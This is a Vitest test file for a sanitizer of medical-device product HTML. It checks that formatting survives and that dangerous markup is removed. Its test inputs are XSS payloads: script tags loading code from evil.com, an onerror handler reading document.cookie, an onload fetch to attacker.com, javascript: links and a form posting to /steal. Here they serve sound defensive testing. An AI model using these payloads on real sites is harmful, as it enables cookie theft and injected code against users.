import { describe, it, expect } from 'vitest';
import { sanitizeProductHtml } from './sanitizer';

describe('sanitizeProductHtml (Product Description Sanitizer)', () => {
  it('1. allows plain text to survive unmodified', () => {
    const input = 'Stethoscope Model 3M Littmann Classic III';
    expect(sanitizeProductHtml(input)).toBe(input);
  });

  it('2. preserves standard medical description formatting tags and attributes', () => {
    const input = '<p>High acoustic sensitivity for performing <strong>general physical assessments</strong>.</p><ul><li>Tunable diaphragm</li><li>Dual-lumen tubing</li></ul>';
    const output = sanitizeProductHtml(input);
    expect(output).toContain('<p>');
    expect(output).toContain('<strong>general physical assessments</strong>');
    expect(output).toContain('<ul><li>Tunable diaphragm</li><li>Dual-lumen tubing</li></ul>');
  });

  it('3. strictly removes <script> tags and executable JavaScript', () => {
    const input = '<p>Description text</p><script>alert("XSS Attack!");</script><script src="http://evil.com/payload.js"></script>';
    const output = sanitizeProductHtml(input);
    expect(output).not.toContain('<script');
    expect(output).not.toContain('alert(');
    expect(output).not.toContain('evil.com');
    expect(output).toBe('<p>Description text</p>');
  });

  it('4. strips inline on* event handlers (onerror, onload, onclick, etc.)', () => {
    const input = '<img src="/valid-device.png" alt="Device" onerror="alert(document.cookie)" onload="fetch(\'https://attacker.com\')" />';
    const output = sanitizeProductHtml(input);
    expect(output).not.toContain('onerror');
    expect(output).not.toContain('onload');
    expect(output).not.toContain('alert');
    expect(output).toContain('src="/valid-device.png"');
    expect(output).toContain('alt="Device"');
  });

  it('5. removes javascript: and vbscript: URLs from hyperlinks', () => {
    const input = '<a href="javascript:alert(1)">Click for user manual</a><a href="https://mymeddevices.com/manual.pdf">Safe Manual</a>';
    const output = sanitizeProductHtml(input);
    expect(output).not.toContain('javascript:');
    expect(output).toContain('<a href="https://mymeddevices.com/manual.pdf" target="_blank" rel="noopener noreferrer">Safe Manual</a>');
  });

  it('6. strips executable embedding elements (iframe, object, embed, form)', () => {
    const input = '<div><h3>Specifications</h3><iframe src="http://evil.com"></iframe><object data="exploit.swf"></object><embed src="test.pdf"></embed><form action="/steal"><input name="pass"/></form></div>';
    const output = sanitizeProductHtml(input);
    expect(output).not.toContain('<iframe');
    expect(output).not.toContain('<object');
    expect(output).not.toContain('<embed');
    expect(output).not.toContain('<form');
    expect(output).not.toContain('<input');
    expect(output).toContain('<div><h3>Specifications</h3></div>');
  });

  it('7. safely normalizes malformed or unclosed HTML', () => {
    const input = '<p>Broken <b>formatting <i>tags without closing';
    const output = sanitizeProductHtml(input);
    expect(output).toContain('<p>Broken <b>formatting <i>tags without closing</i></b></p>');
  });

  it('8. handles empty, null, and non-string inputs safely without crashing', () => {
    expect(sanitizeProductHtml('')).toBe('');
    expect(sanitizeProductHtml(null)).toBe('');
    expect(sanitizeProductHtml(undefined)).toBe('');
    expect(sanitizeProductHtml('   ')).toBe('   ');
    expect(sanitizeProductHtml(12345 as any)).toBe('');
  });
});
